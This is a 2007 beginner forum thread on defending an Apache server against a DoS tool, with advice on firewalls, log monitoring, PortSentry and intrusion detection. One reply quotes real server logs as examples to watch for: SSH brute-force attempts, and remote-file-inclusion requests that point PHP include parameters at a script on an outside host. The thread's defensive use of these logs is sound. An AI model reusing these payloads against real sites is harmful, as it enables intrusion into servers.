---
title: "apache"
date: 2007-02-24
forum: Absolute Beginner Talk
---

### Post by noone123 on 2007-02-24
i could not find the forum wich would be the best for this topic so sry if this topic isnt in the right place. I have seen some DoS wich crashes the apache server some how. Is there any way to fix DoS? The DoS is named: Sprut!

---

### Post by kidders on 2007-02-24
Hi there and welcome,

If you find yourself being bombarded by requests from a small number of hosts, the best thing to do is probably to configure your firewall to drop all packets from the appropriate IPs. That's what I would do anyhow.

One other thing that can be worth doing is monitoring apache's request logs for some common malicious URIs. You could, for instance, create a small script to automatically configure your firewall to block hosts that try to perform any of the usual IIS attacks, or start guessing default URLs used by some common web applications. Pre-emptively blocking hosts *before* they start causing actual problems can be quite an effective defence.

Once any measures you take to protect yourself start to become in any way complicated, it is certainly worth installing some anti-intrusion software. After all, there's no need to reinvent the wheel!

---

### Post by noone123 on 2007-02-25
ok ,thx about the info. But what is anti-intrusion?

---

### Post by Scorpuk on 2007-02-25
Check out PortSentry

Info about it can be found here: [http://www.securityfocus.com/infocus/1580]("http://www.securityfocus.com/infocus/1580")


Check the Synaptic Package Manager for it (you may need to have universe / multiverse in your seources.list file though)

---

### Post by kidders on 2007-02-25
> **noone123 said:**
> ok ,thx about the info. But what is anti-intrusion?

There are two sorts of applications that might be of interest to you. The first uses information made available by your system (such as logs or NIC state information) to audit the activity of remote hosts. Some such applications can take preventive action automatically, when they notice something suspicious.

One example might be:```
Feb 25 15:10:36 myhostname sshd[12627]: Invalid user pcap from 88.191.15.224
Feb 25 15:10:37 myhostname sshd[12632]: Invalid user mailnull from 88.191.15.224
Feb 25 15:10:38 myhostname sshd[12637]: Invalid user dbus from 88.191.15.224
Feb 25 15:10:38 myhostname sshd[12642]: Invalid user eric from 88.191.15.224
Feb 25 15:10:39 myhostname sshd[12647]: Invalid user mcintyem from 88.191.15.224
Feb 25 15:10:41 myhostname sshd[12657]: Invalid user luciano from 88.191.15.224
Feb 25 15:10:42 myhostname sshd[12662]: Invalid user lucian from 88.191.15.224
Feb 25 15:10:43 myhostname sshd[12667]: Invalid user davidson from 88.191.15.224
Feb 25 15:10:43 myhostname sshd[12672]: Invalid user andre from 88.191.15.224
Feb 25 15:10:44 myhostname sshd[12677]: Invalid user andre from 88.191.15.224
Feb 25 15:10:45 myhostname sshd[12682]: Invalid user isabel from 88.191.15.224
Feb 25 15:10:46 myhostname sshd[12687]: Invalid user ondeleta from 88.191.15.224
Feb 25 15:10:47 myhostname sshd[12692]: Invalid user pedropl from 88.191.15.224
Feb 25 15:10:47 myhostname sshd[12697]: Invalid user spong from 88.191.15.224
Feb 25 15:10:48 myhostname sshd[12702]: Invalid user suporte from 88.191.15.224
Feb 25 15:10:49 myhostname sshd[12707]: Invalid user identd from 88.191.15.224
Feb 25 15:10:50 myhostname sshd[12712]: Invalid user wwwdata from 88.191.15.224
```If you're running an SSH server to give yourself easy remote access to your box, you might be interested in blocking IPs that repeatedly fail to authenticate correctly.

Another example:```
210.245.226.61 - - [21/Feb/2007:02:02:59 +0000] "GET /auth.cookie.inc.php?da_path=http://www.deko-centrum.cz/M.txt?/ HTTP/1.1" 404 306 "-" "Morfeus F$$$ing Scanner"
210.245.226.61 - - [21/Feb/2007:02:02:59 +0000] "GET /auth.sessions.inc.php?da_path=http://www.deko-centrum.cz/M.txt?/ HTTP/1.1" 404 308 "-" "Morfeus F$$$ing Scanner"
210.245.226.61 - - [21/Feb/2007:02:03:00 +0000] "GET /includes/common.inc?file_path=http://www.deko-centrum.cz/M.txt?/ HTTP/1.1" 404 306 "-" "Morfeus F$$$ing Scanner"
210.245.226.61 - - [21/Feb/2007:02:03:01 +0000] "GET /admin/dotwidgetc_config.php?file_path=http://www.deko-centrum.cz/M.txt?/ HTTP/1.1" 404 314 "-" "Morfeus F$$$ing Scanner"
210.245.226.61 - - [21/Feb/2007:02:03:01 +0000] "GET /printfriendly.php?file_path=http://www.deko-centrum.cz/M.txt?/ HTTP/1.1" 404 304 "-" "Morfeus F$$$ing Scanner"
210.245.226.61 - - [21/Feb/2007:02:03:02 +0000] "GET /wikiwig/_wk/wk_lang.php?WK[wkPath]=http://www.deko-centrum.cz/M.txt?/ HTTP/1.1" 404 310 "-" "Morfeus F$$$ing Scanner"
210.245.226.61 - - [21/Feb/2007:02:03:03 +0000] "GET /xtremenews/sources/post.php?fil_config=http://www.deko-centrum.cz/M.txt?/ HTTP/1.1" 404 314 "-" "Morfeus F$$$ing Scanner"
210.245.226.61 - - [21/Feb/2007:02:03:03 +0000] "GET /contrib/forms/evaluation/C_FormEvaluation.class.php?GLOBALS[fileroot]=http://www.deko-centrum.cz/M.txt?/ HTTP/1.1" 404 338 "-" "Morfeus F$$$ing Scanner"
210.245.226.61 - - [21/Feb/2007:02:03:04 +0000] "GET /cms-bandits/dialogs/img.php?spaw_root=http://www.deko-centrum.cz/M.txt?/ HTTP/1.1" 404 314 "-" "Morfeus F$$$ing Scanner"
```People who make repeated attempts to access well-known default URLs belonging to applications you haven't even installed deserve to be stonewalled by your Linux box.

The second application type (*real* intrusion detection) tries to scan your system for unknown attack vectors. A common way of doing this is to maintain state information on critical system components, such as the /bin directory, commands like iptables, that commonly run as root, or application config files. Should something change inexplicably (ie no evidence can be found that you "apt-get upgrade"-d it, perhaps), your system can notify you of a suspected intrusion.

That way, you can offer yourself some measure of protection against badly configured services, or as yet unknown flaws in your applications, by detecting and reversing malicious system modifications. It's worth noting however that, on a properly configured Linux box, these are _extremely_ rare.

As Scorpuk mentioned, the package database is the best place to look. You should be cautious with port scan detection though ... aside from the fact that port scans have many legitimate uses, the detection software itself can be susceptible to attack.

---

